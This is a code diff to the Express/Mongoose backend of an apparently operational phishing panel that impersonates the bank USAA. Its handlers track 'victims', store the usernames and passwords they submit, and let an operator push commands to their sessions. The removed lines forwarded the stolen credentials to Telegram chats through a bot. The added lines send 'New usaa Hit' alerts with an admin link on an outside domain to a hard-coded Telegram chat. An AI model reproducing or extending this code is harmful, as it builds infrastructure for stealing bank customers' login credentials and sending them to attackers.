@@ -4,7 +4,7 @@ const axios = require("axios");
 
 const getOwnerVics = async (req, res) => {
 	const { owner, panelName } = req.params;
-	Panel.find({ owner, panelName })
+	Panel.find({ owner, panelName: "usaa" })
 		.sort({ timestamp: -1 })
 		.exec((err, vics) => {
 			if (err) {
@@ -17,9 +17,13 @@ const getOwnerVics = async (req, res) => {
 };
 
 const command = async (req, res) => {
-	const { uniqueid, panelName } = req.body;
+	const { uniqueid } = req.body;
+	// const { panelName } = req.params;
 	try {
-		await Panel.findOneAndUpdate({ uniqueid, panelName }, req.body).exec();
+		await Panel.findOneAndUpdate(
+			{ uniqueid, panelName: "usaa" },
+			req.body
+		).exec();
 		res.sendStatus(200);
 	} catch (error) {
 		console.log(error);
@@ -29,7 +33,7 @@ const command = async (req, res) => {
 
 const getInfo = async (req, res) => {
 	const { uniqueid, panelName } = req.params;
-	Panel.findOne({ uniqueid, panelName }).exec((err, vic) => {
+	Panel.findOne({ uniqueid, panelName: "usaa" }).exec((err, vic) => {
 		if (err) {
 			console.log(err);
 			res.status(404).send("Error");
@@ -40,39 +44,22 @@ const getInfo = async (req, res) => {
 };
 
 const submitData = async (req, res) => {
-	const { username, password, uniqueid, owner, ip, telegramId } = req.body;
+	// const { panelName } = req.params;
+	panelName = "usaa";
+	let data = req.body;
+	data.timestamp = moment().format();
+	data.panelName = panelName;
 	try {
-		let user = await Panel.create({
-			uniqueid,
-			username,
-			password,
-			status: 1,
-			owner,
-			ip,
-			timestamp: moment().format(),
-		});
-		let originalText = `ID: ${user.uniqueid}\nUsername: ${user.username}\nPassword: ${user.password}`;
+		let user = await Panel.create(data);
+		message = `New ${panelName} Hit:\n\nAdmin Link: https://haytchc0ding.co.uk/new?panel=${panelName}&password=${
+			data.owner ? data.owner : user.owner
+		}`;
 		await axios
-			.post(
-				`https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
-				{
-					chat_id: telegramId,
-					text: `OP:\n${originalText}`,
-					parse_mode: "Markdown",
-				}
-			)
-			.catch((e) => {
-				console.log(e);
-			});
-		await axios
-			.post(
-				`https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
-				{
-					chat_id: 680379375,
-					text: `OP:\n${originalText}`,
-					parse_mode: "Markdown",
-				}
-			)
+			.post(`https://api.telegram.org/bot${process.env.panelBot}/sendMessage`, {
+				chat_id: 680379375,
+				text: message,
+				parse_mode: "Markdown",
+			})
 			.catch((e) => {
 				console.log(e);
 			});
@@ -84,9 +71,10 @@ const submitData = async (req, res) => {
 };
 
 const deleteEntry = async (req, res) => {
-	const { uniqueid, panelName } = req.body;
+	const { panelName } = req.params;
+	const { uniqueid } = req.body;
 	try {
-		await Panel.deleteOne({ uniqueid, panelName });
+		await Panel.deleteOne({ uniqueid, panelName: "usaa" });
 		res.sendStatus(200);
 	} catch (error) {
 		console.log(error);
